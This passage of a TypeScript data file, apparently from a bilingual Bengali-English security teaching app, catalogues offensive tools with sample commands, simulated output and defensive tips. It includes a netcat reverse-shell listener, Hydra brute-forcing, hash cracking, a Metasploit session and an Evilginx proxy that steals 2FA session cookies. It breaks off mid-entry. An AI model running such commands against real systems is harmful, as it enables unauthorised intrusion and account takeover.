export interface CyberTool {
  id: string;
  name: string;
  category: 'mobile' | 'web' | 'network' | 'password' | 'phishing' | 'social';
  categoryTitleBn: string;
  categoryTitleEn: string;
  testingTypeEn: string;
  testingTypeBn: string;
  descBn: string;
  descEn: string;
  sampleCommand: string;
  simulatedOutput: string[];
  bestPracticeTipEn: string;
  bestPracticeTipBn: string;
}

export const CYBER_CATEGORIES = [
  { id: 'all', labelEn: 'All Tools (সকল টুলস)', labelBn: 'সকল টুলস' },
  { id: 'mobile', labelEn: '1. Mobile Security & Reversing', labelBn: '১. মোবাইল অ্যাপ ও রিভার্স ইঞ্জিনিয়ারিং' },
  { id: 'web', labelEn: '2. Web Application Security', labelBn: '২. ওয়েব অ্যাপ্লিকেশন সিকিউরিটি' },
  { id: 'network', labelEn: '3. Network & Exploitation', labelBn: '৩. নেটওয়ার্ক ও সিস্টেম এক্সপ্লয়টেশন' },
  { id: 'password', labelEn: '4. Password Auditing & Hash Cracking', labelBn: '৪. পাসওয়ার্ড ক্র্যাকিং ও অডিট' },
  { id: 'phishing', labelEn: '5. Advanced Phishing & 2FA Bypass', labelBn: '৫. অ্যাডভান্সড ফিশিং ও সেশন হাইজ্যাকিং' },
  { id: 'social', labelEn: '6. Social Engineering Tools', labelBn: '৬. সোশ্যাল ইঞ্জিনিয়ারিং ও ফিশিং' }
];

export const CYBER_SECURITY_TOOLS: CyberTool[] = [
  // ১. মোবাইল অ্যাপ সিকিউরিটি ও রিভার্স ইঞ্জিনিয়ারিং (MOBILE SECURITY)
  {
    id: 'mobsf',
    name: 'MobSF (Mobile Security Framework)',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Static & Dynamic Analysis',
    testingTypeBn: 'স্ট্যাটিক ও ডায়নামিক অ্যানালাইসিস',
    descBn: 'অ্যান্ড্রয়েড ও iOS অ্যাপের সোর্স কোড বিশ্লেষণ করে সিকিউরিটি দুর্বলতা (হার্ডকোডেড কী, পারমিশন লিক) খুঁজে বের করে।',
    descEn: 'All-in-one automated mobile application testing framework performing static and dynamic security analysis on Android and iOS.',
    sampleCommand: 'mobsf -f target_app.apk',
    simulatedOutput: [
      '[INFO] Analyzing target_app.apk (Package: com.securebank.app)',
      '[WARN] Hardcoded API Secret found in strings.xml: AIzaSyD-9812...',
      '[CRITICAL] Insecure Data Storage: Shared Preferences allows world-readable access',
      '[INFO] Security Score: 42/100 (High Risk)'
    ],
    bestPracticeTipEn: 'Always run ProGuard/R8 obfuscation and never store API keys in plaintext in APK assets.',
    bestPracticeTipBn: 'এপিকে কোড প্রোগার্ড দিয়ে অবফাসকেট করুন এবং কখনো সোর্স কোডে প্লেইনটেক্সট এপিআই কী রাখবেন না।'
  },
  {
    id: 'frida',
    name: 'Frida',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Dynamic Instrumentation / Hooking',
    testingTypeBn: 'ডায়নামিক ইন্সট্রুমেন্টেশন ও হুকিং',
    descBn: 'চলমান অ্যাপের মেমোরি পরিবর্তন, SSL Pinning বাইপাস এবং জাভা ফাংশন হুক করার কাজে ব্যবহৃত হয়।',
    descEn: 'Dynamic code instrumentation toolkit allowing developers and security researchers to inject JavaScript scripts into native processes.',
    sampleCommand: 'frida -U -f com.target.app -l bypass_ssl_pinning.js',
    simulatedOutput: [
      '[INFO] Spawning `com.target.app`...',
      '[+] Hooking TrustManager.checkServerTrusted()...',
      '[+] SSL Pinning successfully bypassed! Intercepting HTTPS traffic.',
      '[INFO] Function `isDeviceRooted()` hooked: Returning FALSE'
    ],
    bestPracticeTipEn: 'Implement multi-layered root detection and native NDK C++ integrity checks to detect Frida hooks.',
    bestPracticeTipBn: 'নেটিভ C++ এনডিকে লেভেলে ইন্টিগ্রিটি চেক ও অ্যান্টি-ডিবাগিং বসিয়ে ফ্রিডা হুক শনাক্ত করুন।'
  },
  {
    id: 'jadx',
    name: 'JADX',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'APK Decompilation',
    testingTypeBn: 'এপিকে ডিকম্পাইলেশন',
    descBn: 'APK ফাইলকে ডিকম্পাইল করে Smali থেকে মূল রিডেবল Java সোর্স কোড দেখার সুযোগ দেয়।',
    descEn: 'Dex to Java decompiler producing readable Java source code from Android Dex and APK packages.',
    sampleCommand: 'jadx -d ./decompiled_src target_app.apk',
    simulatedOutput: [
      'INFO  - loading target_app.apk ...',
      'INFO  - processing classes.dex ...',
      'INFO  - decompiled 1,420 classes into ./decompiled_src',
      'SUCCESS: Java source generated.'
    ],
    bestPracticeTipEn: 'Decompilation reveals business logic; employ code obfuscation to deter reverse engineering.',
    bestPracticeTipBn: 'ডিকম্পাইল করলেই বিজনেস লজিক ফাঁস হতে পারে, তাই শক্তিশালী অবফাসকেশন দরকার।'
  },
  {
    id: 'apktool',
    name: 'Apktool',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Reverse Engineering / Rebuilding',
    testingTypeBn: 'রিভার্স ইঞ্জিনিয়ারিং ও রিবিল্ডিং',
    descBn: 'APK ডিসঅ্যাসেম্বল করে Smali কোড ও রিসোর্স ফাইল মোডিফাই করে পুনরায় রিবিল্ড ও প্যাক করতে ব্যবহৃত হয়।',
    descEn: 'Tool for reverse engineering 3rd party, closed, binary Android apps. Decodes resources and reassembles them after modifications.',
    sampleCommand: 'apktool d target_app.apk -o ./app_source',
    simulatedOutput: [
      'I: Using Apktool 2.9.3 on target_app.apk',
      'I: Loading resource table...',
      'I: Decoding AndroidManifest.xml with resources...',
      'I: Regular manifest package: com.example.target',
      'I: Baksmaling classes.dex...'
    ],
    bestPracticeTipEn: 'Use app signature verification on backend to reject re-signed tampered APKs.',
    bestPracticeTipBn: 'সার্ভার সাইডে অ্যাপের ডিজিটাল সিগনেচার ভেরিফাই করে পরিবর্তিত এপিকে ব্লক করুন।'
  },
  {
    id: 'objection',
    name: 'Objection',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Runtime Mobile Exploration',
    testingTypeBn: 'রানটাইম মোবাইল এক্সপ্লোরেশন',
    descBn: 'রুট না করা ফোনেও অ্যাপের রানটাইম মেমোরি বিশ্লেষণ ও রুট ডিটেকশন বাইপাস করতে সাহায্য করে।',
    descEn: 'Runtime mobile security exploration toolkit powered by Frida, built to test mobile apps without needing a rooted device.',
    sampleCommand: 'objection --gadget com.target.app explore',
    simulatedOutput: [
      'Using USB device `Pixel 7`',
      '[com.target.app] # android root disable',
      '[+] Successfully patched root checking methods in memory.',
      '[com.target.app] # android sslpinning disable',
      '[+] Custom TrustManager active. Pinning disabled.'
    ],
    bestPracticeTipEn: 'Prevent gadget injection by disabling debuggable flag and validating code checksums.',
    bestPracticeTipBn: 'রিলিজ মোডে android:debuggable="false" রাখুন যাতে কেউ গ্যাজেট ইনজেক্ট করতে না পারে।'
  },
  {
    id: 'drozer',
    name: 'Drozer',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Android IPC Vulnerability Scanning',
    testingTypeBn: 'অ্যান্ড্রয়েড আইপিসি ভালনারেবিলিটি স্ক্যানিং',
    descBn: 'অ্যান্ড্রয়েড অ্যাপের ইনটেন্ট (Intent), সার্ভিস ও কন্টেন্ট প্রোভাইডারের মধ্যে থাকা নিরাপত্তা ত্রুটি খোঁজে।',
    descEn: 'Security assessment framework for Android that searches for vulnerabilities in exported components and IPC mechanisms.',
    sampleCommand: 'drozer console connect',
    simulatedOutput: [
      'dz> run app.package.attacksurface com.target.app',
      'Attacksurface for com.target.app:',
      '  5 activities exported',
      '  1 broadcast receiver exported (SQL Injection in Provider)',
      '  2 content providers exported'
    ],
    bestPracticeTipEn: 'Explicitly set android:exported="false" for internal app components in AndroidManifest.xml.',
    bestPracticeTipBn: 'প্রয়োজন ছাড়া কোনো অ্যাক্টিভিটি বা সার্ভিস android:exported="true" করবেন না।'
  },
  {
    id: 'ghidra',
    name: 'Ghidra',
    category: 'mobile',
    categoryTitleBn: 'মোবাইল অ্যাপ সিকিউরিটি',
    categoryTitleEn: 'Mobile Security',
    testingTypeEn: 'Binary Reverse Engineering',
    testingTypeBn: 'বাইনারি রিভার্স ইঞ্জিনিয়ারিং',
    descBn: 'NSA-এর তৈরি ওপেন সোর্স টুল, যা বাইনারি সফটওয়্যার ব্যাকগ্রাউন্ড বিশ্লেষণ ও এক্সপ্লয়েট বানাতে ব্যবহৃত হয়।',
    descEn: 'Software reverse engineering (SRE) suite developed by the NSA supporting disassembling, assembly, decompilation, and graphing.',
    sampleCommand: 'ghidraRun ./native_lib.so',
    simulatedOutput: [
      '[+] Ghidra SRE v11.0 Initialized',
      '[+] Architecture: ARM64-v8a (Little Endian)',
      '[+] Decompiling function: check_license_key()',
      '    return (memcmp(input_key, "SECRET_KEY_2026", 15) == 0);'
    ],
    bestPracticeTipEn: 'Strip native symbols (`strip -s`) and encrypt confidential binary logic.',
    bestPracticeTipBn: 'নেটিভ লাইব্রেরি থেকে সিম্বল স্ট্রিপ করুন যাতে ফাংশনের নাম ডিকম্পাইল না করা যায়।'
  },

  // ২. ওয়েব অ্যাপ্লিকেশন সিকিউরিটি (WEB APPLICATION SECURITY)
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'HTTP Interception / Web Attack',
    testingTypeBn: 'এইচটিটিপি ইন্টারসেপশন ও ওয়েব অ্যাটাক',
    descBn: 'ওয়েবসাইট ও ব্রাউজারের মাঝের ট্রাফিক আটকে রিকোয়েস্ট মোডিফাই এবং এক্সপ্লয়েট করার সবচেয়ে জনপ্রিয় টুল।',
    descEn: 'Industry standard web vulnerability scanner and proxy tool for intercepting, modifying, and automating HTTP requests.',
    sampleCommand: 'burpsuite --project-file=audit.burp',
    simulatedOutput: [
      '[PROXY] Intercept ON: Port 127.0.0.1:8080 listening',
      'POST /api/v1/transfer HTTP/1.1',
      'Host: vulnerable-bank.local',
      '{"fromAccount": 1001, "toAccount": 9999, "amount": 1000}',
      '[+] Parameter modified in Repeater: "amount": -5000 -> 200 OK'
    ],
    bestPracticeTipEn: 'Always perform authorization and validation on server-side, never trusting client parameters.',
    bestPracticeTipBn: 'সবসময় সার্ভার সাইডে অথোরাইজেশন ভেরিফাই করুন, ক্লায়েন্ট রিকোয়েস্টের ওপর নির্ভর করবেন না।'
  },
  {
    id: 'owasp_zap',
    name: 'OWASP ZAP (Zed Attack Proxy)',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'Automated Web Scanner',
    testingTypeBn: 'অটোমেটেড ওয়েব স্ক্যানার',
    descBn: 'ওয়েব অ্যাপ্লিকেশনের সিকিউরিটি ফ্ল ও বাগ স্বয়ংক্রিয়ভাবে স্ক্যান করার ওপেন-সোর্স টুল।',
    descEn: 'World\'s most popular free, open-source security tool maintained by OWASP for scanning web vulnerabilities in CI/CD.',
    sampleCommand: 'zap-cli quick-scan -s xss,sqli http://target.local',
    simulatedOutput: [
      '[ZAP] Spidering target: http://target.local',
      '[ZAP] Found 48 distinct URLs',
      '[ALERT - HIGH] Reflected Cross-Site Scripting (XSS) at /search?q=',
      '[ALERT - MEDIUM] Missing Anti-Clickjacking header (X-Frame-Options)'
    ],
    bestPracticeTipEn: 'Integrate ZAP in automated DevOps pipelines for continuous security scanning before production deployment.',
    bestPracticeTipBn: 'সিআই/সিডি পাইপলাইনে ZAP যুক্ত করে প্রোডাকশনে যাওয়ার আগে বাগ পরীক্ষা করুন।'
  },
  {
    id: 'mitmproxy',
    name: 'mitmproxy',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'Man-In-The-Middle Proxy',
    testingTypeBn: 'ম্যান-ইন-দ্য-মিডল প্রক্সি',
    descBn: 'কমান্ডলাইনের মাধ্যমে HTTP/HTTPS নেটওয়ার্ক ট্রাফিক ইন্টারসেপ্ট ও অ্যানালাইজ করে।',
    descEn: 'Interactive, SSL/TLS-capable intercepting proxy for HTTP/1, HTTP/2, and WebSockets with Python scripting API.',
    sampleCommand: 'mitmproxy -p 8080',
    simulatedOutput: [
      '>> 200 GET https://api.service.com/user/profile',
      '   401 POST https://auth.service.com/oauth/token',
      '   Flow captured: 14 requests (Total: 480 KB)'
    ],
    bestPracticeTipEn: 'Inspect mobile API telemetry and WebSocket frames seamlessly using mitmproxy scripts.',
    bestPracticeTipBn: 'কমান্ডলাইন স্ক্রিপ্টিং দিয়ে মোবাইল ব্যাকএন্ড এপিআই পরীক্ষা করার জন্য আদর্শ টুল।'
  },
  {
    id: 'sqlmap',
    name: 'sqlmap',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'SQL Injection Attack',
    testingTypeBn: 'এসকিউএল ইনজেকশন অ্যাটাক',
    descBn: 'ওয়েবসাইটের ডাটাবেস হ্যাক করা ও তথ্য চুরি করার জন্য অটোমেটেড SQLi অ্যাটাক চালায়।',
    descEn: 'Automatic SQL injection and database takeover tool detecting and exploiting flaws in parameters.',
    sampleCommand: 'sqlmap -u "http://target.local/item.php?id=1" --dbs',
    simulatedOutput: [
      '[+] Testing parameter \'id\' for Boolean-based blind SQLi...',
      '[+] Target parameter is vulnerable to UNION query SQL injection!',
      'available databases [3]:',
      '[*] information_schema',
      '[*] web_store_production',
      '[*] mysql'
    ],
    bestPracticeTipEn: 'Always use parameterized queries (Prepared Statements / ORM) and disable raw string SQL concatenation.',
    bestPracticeTipBn: 'সবসময় প্রিপেয়ার্ড স্টেটমেন্ট (Prepared Statements / ORM) ব্যবহার করে কোয়েরি রান করুন।'
  },
  {
    id: 'nikto',
    name: 'Nikto',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'Web Server Vulnerability Scanner',
    testingTypeBn: 'ওয়েব সার্ভার ভালনারেবিলিটি স্ক্যানার',
    descBn: 'ওয়েব সার্ভারের পুরাতন সফটওয়্যার, বিপজ্জনক ফাইল ও কনফিগারেশন ত্রুটি স্ক্যান করে।',
    descEn: 'Scans web servers for outdated software versions, dangerous default files, and CGI misconfigurations.',
    sampleCommand: 'nikto -h http://target.local',
    simulatedOutput: [
      '+ Server: Apache/2.4.29 (Ubuntu)',
      '+ Server leaks inodes via ETags, header found with file /index.html',
      '+ The anti-clickjacking X-Frame-Options header is not present.',
      '+ /admin/: Directory indexing is enabled (403 or visible directory listing).'
    ],
    bestPracticeTipEn: 'Harden web server configs by disabling Directory Indexing and setting HTTP security headers (HSTS, CSP).',
    bestPracticeTipBn: 'ওয়েব সার্ভারের ডিরেক্টরি ব্রাউজিং অফ রাখুন এবং সিকিউরিটি হেডার কনফিগার করুন।'
  },
  {
    id: 'nuclei',
    name: 'Nuclei',
    category: 'web',
    categoryTitleBn: 'ওয়েব অ্যাপ্লিকেশন সিকিউরিটি',
    categoryTitleEn: 'Web App Security',
    testingTypeEn: 'Template-based Vulnerability Scanner',
    testingTypeBn: 'টেমপ্লেট-ভিত্তিক ভালনারেবিলিটি স্ক্যানার',
    descBn: 'কাস্টম টেক্সট টেমপ্লেট ব্যবহার করে অত্যন্ত দ্রুত ওয়েব সার্ভারের বাগ সনাক্ত করে।',
    descEn: 'Fast and customizable vulnerability scanner powered by community YAML templates covering modern CVEs.',
    sampleCommand: 'nuclei -u https://target.local -t cves/ -severity critical,high',
    simulatedOutput: [
      '[INF] Current nuclei version: v3.2.0',
      '[INF] Loaded templates: 1,840',
      '[CVE-2024-21413] [http] [critical] https://target.local/auth',
      '[exposed-git-dir] [http] [high] https://target.local/.git/config'
    ],
    bestPracticeTipEn: 'Use Nuclei for rapid attack surface management and patch verification across entire IP ranges.',
    bestPracticeTipBn: 'কমিউনিটি টেমপ্লেট দিয়ে নতুন আবিষ্কৃত সিভিয়াই (CVE) দ্রুত যাচাই করতে ব্যবহার করুন।'
  },

  // ৩. নেটওয়ার্ক অ্যানালাইসিস ও সিস্টেম এক্সপ্লয়টেশন (NETWORK & EXPLOITATION)
  {
    id: 'kali',
    name: 'Kali Linux',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'Penetration Testing OS',
    testingTypeBn: 'পেনেট্রেশন টেস্টিং ওএস',
    descBn: 'শত শত হ্যাকিং ও সিকিউরিটি টুল প্রি-ইনস্টল করা পেনেট্রেশন টেস্টিং ভিত্তিক লিনাক্স ওএস।',
    descEn: 'Debian-derived Linux distribution designed for digital forensics, penetration testing, and security auditing.',
    sampleCommand: 'cat /etc/os-release',
    simulatedOutput: [
      'PRETTY_NAME="Kali GNU/Linux Rolling"',
      'ID=kali',
      'VERSION="2024.1"',
      'Tools Available: 600+ Preinstalled Security Tools'
    ],
    bestPracticeTipEn: 'Always practice ethical hacking only inside controlled authorized labs (TryHackMe, HackTheBox).',
    bestPracticeTipBn: 'অনুমতি ছাড়া অন্যের নেটওয়ার্কে হ্যাকিং টুল ব্যবহার আইনত দণ্ডনীয়।'
  },
  {
    id: 'adb',
    name: 'ADB (Android Debug Bridge)',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'Android Device Debugging / Control',
    testingTypeBn: 'অ্যান্ড্রয়েড ডিভাইস ডিবাগিং ও কন্ট্রোল',
    descBn: 'পিসি থেকে কমান্ড লাইনের মাধ্যমে অ্যান্ড্রয়েড ফোন নিয়ন্ত্রণ, শেল অ্যাক্সেস ও ফাইল ট্রান্সফার করে।',
    descEn: 'Versatile command-line tool allowing communication with an Android device for file push/pull, shell execution, and logcat debugging.',
    sampleCommand: 'adb devices && adb shell id',
    simulatedOutput: [
      'List of devices attached',
      'emulator-5554   device',
      'uid=2000(shell) gid=2000(shell) groups=2000(shell),1004(input),1007(log)'
    ],
    bestPracticeTipEn: 'Always turn off USB Debugging on your personal phone when connected to public USB charging kiosks.',
    bestPracticeTipBn: 'পাবলিক চার্জিং স্টেশনে ফোন কানেক্ট করার আগে USB Debugging অবশ্যই বন্ধ রাখুন।'
  },
  {
    id: 'nmap',
    name: 'Nmap (Network Mapper)',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'Port Scanning & Network Discovery',
    testingTypeBn: 'পোর্ট স্ক্যানিং ও নেটওয়ার্ক আবিষ্কার',
    descBn: 'নেটওয়ার্কে যুক্ত ডিভাইস, ওপেন পোর্ট এবং সেগুলোতে চলমান সার্ভিস সনাক্ত করে।',
    descEn: 'Network discovery and vulnerability scanning tool using raw IP packets to discover hosts and open services.',
    sampleCommand: 'nmap -sV -p 22,80,443 192.168.1.1',
    simulatedOutput: [
      'Nmap scan report for router.local (192.168.1.1)',
      'PORT    STATE SERVICE  VERSION',
      '22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu',
      '80/tcp  open  http     Apache 2.4.52',
      '443/tcp open  ssl/http Apache 2.4.52'
    ],
    bestPracticeTipEn: 'Use network firewalls to block unnecessary open ports and enforce host-based packet filtering.',
    bestPracticeTipBn: 'অপ্রয়োজনীয় সার্ভিস পোর্ট ফায়ারওয়াল দিয়ে বন্ধ রাখুন যাতে তথ্য ফাঁস না হয়।'
  },
  {
    id: 'metasploit',
    name: 'Metasploit Framework',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'System Exploitation Framework',
    testingTypeBn: 'সিস্টেম এক্সপ্লয়টেশন ফ্রেমওয়ার্ক',
    descBn: 'বিভিন্ন অপারেটিং সিস্টেম ও সার্ভারের সিকিউরিটি হোল খুঁজে এক্সপ্লয়েট ও পে-লোড পাঠায়।',
    descEn: 'World\'s most used penetration testing framework providing known exploit code, payloads, and shell listeners.',
    sampleCommand: 'msfconsole -q',
    simulatedOutput: [
      'msf6 > use exploit/multi/http/apache_druid_rce',
      'msf6 exploit(apache_druid_rce) > set RHOSTS 192.168.1.50',
      'msf6 exploit(apache_druid_rce) > run',
      '[*] Sending payload stage (200 bytes)...',
      '[+] Meterpreter session 1 opened!'
    ],
    bestPracticeTipEn: 'Patch systems regularly to eliminate CVE vulnerabilities before exploits can compromise infrastructure.',
    bestPracticeTipBn: 'সিস্টেমে রেগুলার সিকিউরিটি প্যাচ ইনস্টল করে এক্সপ্লয়েট প্রতিরোধ করুন।'
  },
  {
    id: 'wireshark',
    name: 'Wireshark',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'Packet Sniffing & Traffic Analysis',
    testingTypeBn: 'প্যাকেট স্নিফিং ও ট্রাফিক বিশ্লেষণ',
    descBn: 'নেটওয়ার্কে যাতায়াতকারী প্রতিটা ডেটা প্যাকেট রিয়েল-টাইমে ধরে বিশ্লেষণ করে।',
    descEn: 'World\'s foremost network protocol analyzer capturing and interactively browsing traffic running on a computer network.',
    sampleCommand: 'wireshark -i eth0 -k',
    simulatedOutput: [
      '[+] Capturing on interface eth0',
      'No. 1  0.000  192.168.1.50 -> 192.168.1.254  TCP  54321 > 443 [SYN]',
      'No. 2  0.002  192.168.1.254 -> 192.168.1.50  TCP  443 > 54321 [SYN, ACK]',
      'No. 3  0.003  192.168.1.50 -> 192.168.1.254  TCP  54321 > 443 [ACK]'
    ],
    bestPracticeTipEn: 'Always enforce modern encryption (TLS 1.3 / SSH) so packet sniffers only see ciphertext.',
    bestPracticeTipBn: 'সব যোগাযোগে TLS এনক্রিপশন ব্যবহার করুন যাতে স্নিফিং করলেও কেউ ডাটা পড়তে না পারে।'
  },
  {
    id: 'tcpdump',
    name: 'tcpdump',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'CLI Packet Sniffer',
    testingTypeBn: 'সিএলআই প্যাকেট স্নিফার',
    descBn: 'টার্মিনাল থেকে সরাসরি নেটওয়ার্ক প্যাকেট ক্যাপচার এবং ফিল্টার করার হালকা টুল।',
    descEn: 'Lightweight command-line packet analyzer displaying TCP/IP and other packets being transmitted over a network.',
    sampleCommand: 'tcpdump -i eth0 -n -c 4',
    simulatedOutput: [
      '10:55:01.001 IP 192.168.1.50.51200 > 1.1.1.1.53: 54101+ A? google.com. (28)',
      '10:55:01.015 IP 1.1.1.1.53 > 192.168.1.50.51200: 54101 1/0/0 A 142.250.190.46 (44)',
      '4 packets captured, 4 packets received by filter'
    ],
    bestPracticeTipEn: 'Ideal for head-less Linux servers to diagnose network packet loss and routing anomalies.',
    bestPracticeTipBn: 'সার্ভারে কোনো গ্রাফিক্যাল ইন্টারফেস না থাকলে নেটওয়ার্ক ট্রাবলশুটিং করতে এটি সেরা।'
  },
  {
    id: 'netcat',
    name: 'Netcat (nc)',
    category: 'network',
    categoryTitleBn: 'নেটওয়ার্ক ও এক্সপ্লয়টেশন',
    categoryTitleEn: 'Network & Exploitation',
    testingTypeEn: 'Port Listener / Reverse Shell',
    testingTypeBn: 'পোর্ট লিসেনার ও রিভার্স শেল',
    descBn: 'TCP/UDP পোর্টে ডেটা পাঠানো, রিসিভ করা এবং রিভার্স শেল কানেকশন তৈরিতে ব্যবহৃত হয়।',
    descEn: 'The "Swiss Army knife" of networking, writing and reading data across network connections using TCP or UDP.',
    sampleCommand: 'nc -lvnp 4444',
    simulatedOutput: [
      'Listening on 0.0.0.0 4444 ...',
      'Connection received on 192.168.1.75 51230',
      'Linux victim-host 5.15.0 #1 SMP x86_64'
    ],
    bestPracticeTipEn: 'Monitor outgoing ports on firewalls to block unauthorized outbound reverse shell connections.',
    bestPracticeTipBn: 'ফায়ারওয়ালে আউটবাউন্ড পোর্ট রেস্ট্রিকশন দিয়ে রিভার্স শেল কানেকশন প্রতিরোধ করুন।'
  },

  // ৪. পাসওয়ার্ড ক্র্যাকিং ও ক্রেডেনশিয়াল অডিট (PASSWORD AUDITING)
  {
    id: 'hydra',
    name: 'Hydra (THC-Hydra)',
    category: 'password',
    categoryTitleBn: 'পাসওয়ার্ড অডিটিং',
    categoryTitleEn: 'Password Auditing',
    testingTypeEn: 'Online Brute Force Attack',
    testingTypeBn: 'অনলাইন ব্রুট ফোর্স অ্যাটাক',
    descBn: 'SSH, FTP, HTTP সহ বিভিন্ন লগইন পোর্টালে দ্রুত ইউজারনেম ও পাসওয়ার্ড গেস করে brute-force করে।',
    descEn: 'Fast network logon cracker supporting numerous protocols (SSH, FTP, HTTP, SMB, RDP, MySQL).',
    sampleCommand: 'hydra -l admin -P wordlist.txt 192.168.1.1 ssh',
    simulatedOutput: [
      'Hydra v9.5 starting online attack on 192.168.1.1:22 (ssh)...',
      '[22][ssh] host: 192.168.1.1   login: admin   password: password123',
      '1 of 1 target completed, 1 valid password found'
    ],
    bestPracticeTipEn: 'Use rate limiting, account lockout policies, Fail2ban, and multi-factor authentication (MFA).',
    bestPracticeTipBn: 'Fail2ban এবং রেট লিমিটিং ব্যবহার করে ব্রুট-ফোর্স প্রচেষ্টা বন্ধ করুন।'
  },
  {
    id: 'john',
    name: 'John the Ripper',
    category: 'password',
    categoryTitleBn: 'পাসওয়ার্ড অডিটিং',
    categoryTitleEn: 'Password Auditing',
    testingTypeEn: 'Offline Password Hash Cracking',
    testingTypeBn: 'অফলাইন পাসওয়ার্ড হ্যাশ ক্র্যাকিং',
    descBn: 'এনক্রিপ্ট করা বা হ্যাশ অবস্থায় থাকা পাসওয়ার্ড অফলাইনে ভেঙে মূল পাসওয়ার্ড বের করে।',
    descEn: 'Rapid password cracker designed to detect weak Unix/Linux passwords, SHA-512, MD5, and Kerberos hashes.',
    sampleCommand: 'john --wordlist=rockyou.txt hashes.txt',
    simulatedOutput: [
      'Using default input encoding: UTF-8',
      'Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])',
      'password123      (cmnatic)',
      '1 password hash cracked, 0 left'
    ],
    bestPracticeTipEn: 'Store passwords with slow, salted hashing algorithms such as Argon2id or bcrypt (cost factor 12+).',
    bestPracticeTipBn: 'সল্টেড ও স্লো অ্যালগরিদম (যেমন Argon2id বা bcrypt) দিয়ে পাসওয়ার্ড হ্যাশ সংরক্ষণ করুন।'
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    category: 'password',
    categoryTitleBn: 'পাসওয়ার্ড অডিটিং',
    categoryTitleEn: 'Password Auditing',
    testingTypeEn: 'GPU-Accelerated Hash Cracking',
    testingTypeBn: 'জিপিইউ-এক্সিলারেটেড হ্যাশ ক্র্যাকিং',
    descBn: 'গ্রাফিক্স কার্ড (GPU) ব্যবহার করে অত্যন্ত দ্রুতগতির সাথে পাসওয়ার্ড হ্যাশ ক্র্যাক করে।',
    descEn: 'World\'s fastest and most advanced password recovery utility utilizing GPU acceleration (billions of hashes/sec).',
    sampleCommand: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt',
    simulatedOutput: [
      'Device #1: NVIDIA GeForce RTX 4090, 24564 MB, 128MCU',
      'Speed.#1.........: 74210.5 MH/s (Hash speed: 74 Billion hashes/sec)',
      'e10adc3949ba59abbe56e057f20f883e:123456',
      'Status...........: Cracked'
    ],
    bestPracticeTipEn: 'Strong passwords exceeding 16 mixed characters are mathematically immune to brute-force attacks.',
    bestPracticeTipBn: '১৬ ক্যারেক্টারের বেশি বড় ও বৈচিত্র্যময় পাসওয়ার্ড ব্যবহার করলে তা জিপিইউ দিয়েও ভাঙা যায় না।'
  },

  // ৫. অ্যাডভান্সড ফিশিং ও সেশন হাইজ্যাকিং (ADVANCED PHISHING)
  {
    id: 'evilginx',
    name: 'Evilginx (Evilginx 3)',
    category: 'phishing',
    categoryTitleBn: 'অ্যাডভান্সড ফিশিং',
    categoryTitleEn: 'Advanced Phishing',
    testingTypeEn: 'Reverse Proxy Phishing / 2FA Bypass',
    testingTypeBn: 'রিভার্স প্রক্সি ফিশিং ও টু-ফ্যাক্টর বাইপাস',
    descBn: 'রিভার্স প্রক্সি ব্যবহার করে লগইন ক্রেডেনশিয়াল এবং 2FA সেশন কুকি বাইপাস করে চুরি করে।',
    descEn: 'Man-in-the-middle attack framework used for phishing login credentials along with session cookies, bypassing 2FA.',
    sampleCommand: 'evilginx -p ./phishlets',
    simulatedOutput: [
      '[evilginx] Phishlet `microsoft` loaded.',
      '[evilginx] Listening on proxy https://login.fake-verify.com',
      '[INTERCEPT] Victim entered valid password & 2FA OTP code.',
      '[STOLEN] Session Cookie captured: ESTSAUTH=0.AXsA... (Bypassed 2FA!)'
    ],
    bestPracticeTipEn: 'Deploy FIDO2 / WebAuthn hardware security keys (YubiKeys) which are completely immune to reverse proxy phishing.',
